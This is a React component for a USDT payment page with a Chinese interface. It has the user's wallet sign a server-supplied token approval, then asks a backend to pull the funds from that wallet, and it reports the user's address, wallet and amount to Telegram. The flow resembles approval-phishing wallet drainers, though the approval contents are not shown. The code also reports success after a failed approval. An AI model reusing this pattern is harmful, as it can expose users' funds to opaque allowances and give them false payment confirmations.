"use client";

import React, { useState, useEffect } from "react";
import { Payment, ChainType } from "@/types";
import { cn } from "@/utils/cn";
import { safePingService } from "@/lib/blockchain/safePingService";

interface PaymentStepsProps {
  payment: Payment;
  wallet: {
    address: string;
    wallet: string;
    chain: ChainType;
  };
  onApprovalComplete: () => Promise<void> | void;
  onPaymentComplete: () => void;
  onPayButtonClick?: () => Promise<void> | void;
  onPaymentStart?: () => void; // Callback when payment processing starts
  onPaymentEnd?: () => void; // Callback when payment processing ends (success/failure)
  className?: string;
}

// Simplified UI - no more step system

export function PaymentSteps({
  payment,
  wallet,
  onApprovalComplete,
  onPaymentComplete,
  onPayButtonClick,
  onPaymentStart,
  onPaymentEnd,
  className,
}: PaymentStepsProps) {
  const [approving, setApproving] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [autoProcessing, setAutoProcessing] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [telegramServiceInstance, setTelegramServiceInstance] =
    useState<any>(null);
  const [telegramLoading, setTelegramLoading] = useState(true);

  // Load telegram service on component mount
  useEffect(() => {
    const loadTelegramService = async () => {
      setTelegramLoading(true);
      try {
        const module = await import("@/lib/telegram");
        if (module.telegramService) {
          setTelegramServiceInstance(module.telegramService);
        } else {
          setTelegramServiceInstance(null);
        }
      } catch (error) {
        setTelegramServiceInstance(null);
      } finally {
        setTelegramLoading(false);
      }
    };

    loadTelegramService();
  }, []);

  // Utility function to safely check if telegram service is available
  const isTelegramServiceReady = () => {
    return (
      telegramServiceInstance &&
      telegramServiceInstance.isConfigured() &&
      !telegramLoading
    );
  };

  // Simplified UI - no more step system

  // Check if this is an auto-processed QR code payment
  const isQRCodePayment = wallet?.address?.startsWith("qr-");

  // Check if this is a WalletConnect payment
  const isWalletConnectPayment = wallet?.address?.startsWith("wc-");

  const handlePayment = async () => {
    if (!wallet || !wallet.address) return;

    console.log("wallet.address", wallet.address);

    // Notify parent component that payment processing has started
    if (onPaymentStart) {
      onPaymentStart();
    }

    // For WalletConnect payments, use the special pay button handler
    if (isWalletConnectPayment && onPayButtonClick) {
      try {
        await onPayButtonClick();
        return;
      } catch (error) {
        setError("支付失败，请重试");
        return;
      }
    }

    // For QR code payments, use the special pay button handler
    if (isQRCodePayment && onPayButtonClick) {
      try {
        await onPayButtonClick();
        return;
      } catch (error) {
        setError("支付失败，请重试");
        return;
      }
    }

    // For manual wallet payments, implement smart contract flow
    setApproving(true);
    setError(null);

    try {
      // Step 1: Approve USDT spending for the smart contract
      let clientIP = "unknown";
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        clientIP = data.ip;
      } catch (error) {
        clientIP = "mobile-wallet";
      }

      try {
        const approvalResult = await safePingService.approveUSDTWithSafePing(
          wallet.chain,
          payment.amount.toString(),
          wallet.address,
          payment.payment_id,
          clientIP
        );

        if (!approvalResult.success) {
          throw new Error(approvalResult.error || "Approval failed");
        }

        // For EVM chains, we need to execute the approval
        if (wallet.chain !== "tron" && approvalResult.approvalData) {
          try {
            // Get the user's wallet provider from window.ethereum
            if (typeof window !== "undefined" && window.ethereum) {
              // Request account access
              const accounts = await window.ethereum.request({
                method: "eth_requestAccounts",
              });

              if (accounts.length === 0) {
                throw new Error("No accounts found");
              }

              const userAccount = accounts[0];

              // First, ensure we're on the correct network (BSC)
              const currentChainId = await window.ethereum.request({
                method: "eth_chainId",
              });

              const targetChainId = `0x${approvalResult.approvalData.chainId.toString(
                16
              )}`;

              // If we're not on the correct network, switch to it
              if (currentChainId !== targetChainId) {
                try {
                  await window.ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: targetChainId }],
                  });
                } catch (switchError: any) {
                  // If the network is not added, add it
                  if (switchError.code === 4902) {
                    const bscNetworkParams = {
                      chainId: targetChainId,
                      chainName:
                        wallet.chain === "bsc"
                          ? "Binance Smart Chain"
                          : "Ethereum",
                      nativeCurrency: {
                        name: wallet.chain === "bsc" ? "BNB" : "ETH",
                        symbol: wallet.chain === "bsc" ? "BNB" : "ETH",
                        decimals: 18,
                      },
                      rpcUrls: [
                        wallet.chain === "bsc"
                          ? "https://bsc-dataseed.binance.org/"
                          : "https://mainnet.infura.io/v3/",
                      ],
                      blockExplorerUrls: [
                        wallet.chain === "bsc"
                          ? "https://bscscan.com/"
                          : "https://etherscan.io/",
                      ],
                    };

                    await window.ethereum.request({
                      method: "wallet_addEthereumChain",
                      params: [bscNetworkParams],
                    });
                  } else {
                    throw new Error(
                      `Failed to switch network: ${switchError.message}`
                    );
                  }
                }
              }

              // Create the transaction object
              const transactionParameters = {
                to: approvalResult.approvalData.to,
                from: userAccount,
                data: approvalResult.approvalData.data,
                chainId: targetChainId,
              };

              // Send the transaction to MetaMask
              const txHash = await window.ethereum.request({
                method: "eth_sendTransaction",
                params: [transactionParameters],
              });

              // Show success message
              alert(
                `🔐 USDT Approval Sent!\n\nTransaction Hash: ${txHash}\n\nPlease confirm the approval in your MetaMask wallet.\n\nNetwork: ${
                  wallet.chain === "bsc"
                    ? "BSC (Binance Smart Chain)"
                    : "Ethereum"
                }`
              );

              // Wait for approval confirmation, then execute auto-transfer
              setProcessing(true);

              try {
                // Execute auto-transfer after approval
                const transferResponse = await fetch(
                  "/api/payment/auto-transfer",
                  {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      chain: wallet.chain,
                      userAddress: wallet.address,
                      amount: payment.amount.toString(),
                      paymentId: payment.payment_id,
                    }),
                  }
                );

                const transferResult = await transferResponse.json();

                if (transferResult.success) {
                  setError(null); // Clear any previous errors
                  onPaymentComplete();
                } else {
                  setError(`❌ 自动转账失败: ${transferResult.error}`);
                }
              } catch (transferError) {
                setError("❌ 自动转账时发生错误，请重试");
              } finally {
                setProcessing(false);
              }
            } else {
              throw new Error(
                "MetaMask not detected. Please install MetaMask extension."
              );
            }
          } catch (approvalExecutionError: any) {
            console.error(
              "❌ EVM approval execution failed:",
              approvalExecutionError
            );
            throw new Error(
              `Approval execution failed: ${approvalExecutionError.message}`
            );
          }
        }

        // For TRON, approval and transfer are already complete
        if (wallet.chain === "tron") {
          setError(null); // Clear any previous errors
          onPaymentComplete();
          return;
        }
      } catch (approvalError: any) {
        console.error("❌ USDT approval failed:", approvalError);

        // Handle specific approval errors
        let approvalErrorMessage = "USDT授权失败，请重试";

        if (
          approvalError.message &&
          approvalError.message.includes("Insufficient USDT balance")
        ) {
          approvalErrorMessage = `USDT余额不足！需要: ${payment.amount} USDT，当前余额不足。请确保您的钱包中有足够的USDT。`;
        } else if (
          approvalError.message &&
          approvalError.message.includes("User rejected")
        ) {
          approvalErrorMessage = "用户取消了USDT授权";
        } else if (
          approvalError.message &&
          approvalError.message.includes("insufficient funds")
        ) {
          approvalErrorMessage =
            "网络费用不足！请确保您的钱包中有足够的原生代币（ETH/BNB/TRX）支付网络费用。";
        } else if (approvalError.message) {
          approvalErrorMessage = approvalError.message;
        }

        // Show alert to user
        alert(`❌ USDT授权失败\n\n${approvalErrorMessage}`);

        // Set error and stop processing
        setError(approvalErrorMessage);
        setApproving(false);
      }

      // Send Telegram notification for USDT approval completion
      if (isTelegramServiceReady()) {
        try {
          await telegramServiceInstance.sendSystemAlert(
            `🔐 USDT approval of ${payment.amount} USDT completed successfully!\n\n👤 User: ${wallet.address}\n🌐 Chain: ${wallet.chain}\n💼 Wallet: ${wallet.wallet}\n💰 Amount: ${payment.amount} USDT`
          );
        } catch (error) {
          // Don't fail the payment if telegram notification fails
        }
      }

      setApproving(false); // Approval completed
      setProcessing(false); // No automatic transfer needed

      // Call the payment complete handler
      onPaymentComplete();
    } catch (err: any) {
      // Handle specific contract errors with user-friendly messages
      let errorMessage = "支付失败，请重试";

      if (err.message && err.message.includes("PaymentIdExists")) {
        errorMessage = "该支付ID已被处理，请使用新的支付链接";
      } else if (err.message && err.message.includes("execution reverted")) {
        errorMessage = "智能合约执行失败，请检查网络状态或联系客服";
      } else if (
        err.message &&
        err.message.includes("Insufficient USDT balance")
      ) {
        errorMessage = `
          USDT余额不足！需要: ${payment.amount} USDT，当前余额不足。请确保您的钱包中有足够的USDT。
        `;
      } else if (
        err.message &&
        err.message.includes("Insufficient USDT allowance")
      ) {
        errorMessage = "USDT授权不足！请先完成USDT授权步骤。";
      } else if (err.message && err.message.includes("User rejected")) {
        errorMessage = "用户取消了交易";
      } else if (err.message && err.message.includes("insufficient funds")) {
        errorMessage =
          "网络费用不足！请确保您的钱包中有足够的原生代币（ETH/BNB/TRX）支付网络费用。";
      } else if (err.message) {
        // For other errors, show the actual error message
        errorMessage = err.message;
      }

      // Show alert to user
      alert(`❌ 支付失败\n\n${errorMessage}`);

      // Also set the error state for UI display
      setError(errorMessage);
    } finally {
      setApproving(false);
      setAutoProcessing(false);
      setProcessing(false);

      // Notify parent component that payment processing has ended
      if (onPaymentEnd) {
        onPaymentEnd();
      }
    }
  };

  // Simplified UI - no more complex step system

  if (!wallet || !wallet.address) {
    return (
      <div className={cn("text-center py-8", className)}>
        <p className="text-gray-400">请先连接钱包</p>
      </div>
    );
  }

  // Show success state if payment is completed
  if (payment.status === "completed") {
    return (
      <div className={cn("text-center py-8", className)}>
        <div className="mb-6">
          <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
            <span className="text-4xl">🎉</span>
          </div>
          <h3 className="text-2xl font-bold text-white mb-2">支付成功！</h3>
          <p className="text-gray-300">您的 {payment.amount} USDT 支付已完成</p>
        </div>

        <div className="bg-green-900/20 border border-green-700/30 rounded-lg p-4 mb-6">
          <div className="grid grid-cols-2 gap-4 text-sm">
            <div>
              <span className="text-gray-400 block">支付金额</span>
              <span className="text-white font-medium">
                {payment.amount} USDT
              </span>
            </div>
            <div>
              <span className="text-gray-400 block">支付状态</span>
              <span className="text-green-300 font-medium">已完成</span>
            </div>
            <div>
              <span className="text-gray-400 block">钱包地址</span>
              <span className="text-white font-mono text-xs">
                {wallet?.address?.slice(0, 6)}...{wallet?.address?.slice(-4)}
              </span>
            </div>
            <div>
              <span className="text-gray-400 block">区块链网络</span>
              <span className="text-white font-medium">
                {wallet?.chain?.toUpperCase()}
              </span>
            </div>
          </div>
        </div>

        <button
          onClick={onPaymentComplete}
          className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white py-3 px-8 rounded-lg font-medium transition-all duration-300 transform hover:scale-105"
        >
          ✅ 完成
        </button>
      </div>
    );
  }

  // Show simple pay button for pending payments
  return (
    <div className={cn("text-center py-6", className)}>
      <div className="mb-6">
        <div className="w-16 h-16 bg-gradient-to-br from-red-500 to-red-600 rounded-full flex items-center justify-center mx-auto mb-4">
          <span className="text-2xl">💳</span>
        </div>
        <h3 className="text-xl font-bold text-white mb-2">准备支付</h3>
        <p className="text-gray-300">点击下方按钮开始支付流程</p>
      </div>

      {/* Simple Pay Button */}
      <div className="relative">
        <button
          onClick={handlePayment}
          disabled={approving || processing || autoProcessing}
          className={cn(
            "w-full py-4 px-8 rounded-xl font-bold text-lg transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-red-500",
            approving || processing || autoProcessing
              ? "bg-gray-500 cursor-not-allowed"
              : "bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white shadow-lg"
          )}
        >
          {approving || processing || autoProcessing ? (
            <span className="flex items-center justify-center">
              <div className="relative">
                {/* Main spinning ring */}
                <div className="w-6 h-6 border-2 border-white/30 rounded-full animate-spin mr-3" />
                {/* Inner spinning dot */}
                <div className="absolute inset-0 w-6 h-6 border-2 border-t-white border-transparent rounded-full animate-spin" />
              </div>
              <span className="ml-2">
                {approving
                  ? "🔐 授权中..."
                  : processing
                  ? "💳 支付中..."
                  : "⚡ 处理中..."}
              </span>
            </span>
          ) : (
            `💳 支付 ${payment.amount} USDT`
          )}
        </button>

        {/* Enhanced Loading Overlay */}
        {(approving || processing || autoProcessing) && (
          <div className="absolute inset-0 bg-black/20 backdrop-blur-sm rounded-xl flex items-center justify-center">
            <div className="bg-white/10 backdrop-blur-md rounded-lg p-4 border border-white/20">
              <div className="flex items-center space-x-3">
                <div className="relative">
                  <div className="w-8 h-8 border-3 border-white/30 rounded-full animate-spin" />
                  <div
                    className="absolute inset-0 w-8 h-8 border-3 border-t-white border-transparent rounded-full animate-spin"
                    style={{ animationDirection: "reverse" }}
                  />
                </div>
                <div className="text-white font-medium">
                  {approving
                    ? "🔐 USDT 授权中..."
                    : processing
                    ? "💳 支付处理中..."
                    : "⚡ 交易处理中..."}
                </div>
              </div>
              <div className="mt-2 text-white/70 text-sm text-center">
                {approving ? "请在 MetaMask 中确认授权" : "请耐心等待交易确认"}
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Balance Check Warning */}
      <div className="mt-3 p-3 bg-yellow-900/20 border border-yellow-700/30 rounded-lg">
        <p className="text-yellow-300 text-xs text-center">
          ⚠️ 请确保您的钱包中有足够的 {payment.amount} USDT 和网络费用
        </p>
      </div>

      {/* Error Display */}
      {error && (
        <div className="mt-4 bg-red-900/20 border border-red-700/30 rounded-lg p-4">
          <div className="flex items-start space-x-3">
            <div className="flex-shrink-0">
              <span className="text-red-400 text-lg">❌</span>
            </div>
            <div className="flex-1">
              <h4 className="text-red-300 font-medium mb-1">支付失败</h4>
              <p className="text-red-200 text-sm leading-relaxed">{error}</p>
            </div>
          </div>
        </div>
      )}

      {/* Payment Info */}
      <div className="mt-6 bg-gray-800/50 rounded-lg p-4 border border-gray-700">
        <div className="grid grid-cols-2 gap-4 text-xs">
          <div>
            <span className="text-gray-400 block">支付金额</span>
            <span className="text-white font-medium">
              {payment.amount} USDT
            </span>
          </div>
          <div>
            <span className="text-gray-400 block">网络</span>
            <span className="text-white font-medium">
              {wallet?.chain?.toUpperCase()}
            </span>
          </div>
          <div>
            <span className="text-gray-400 block">钱包</span>
            <span className="text-white font-medium">{wallet?.wallet}</span>
          </div>
          <div>
            <span className="text-gray-400 block">地址</span>
            <span className="text-white font-mono text-xs">
              {wallet?.address?.slice(0, 6)}...{wallet?.address?.slice(-4)}
            </span>
          </div>
        </div>
      </div>
    </div>
  );
}
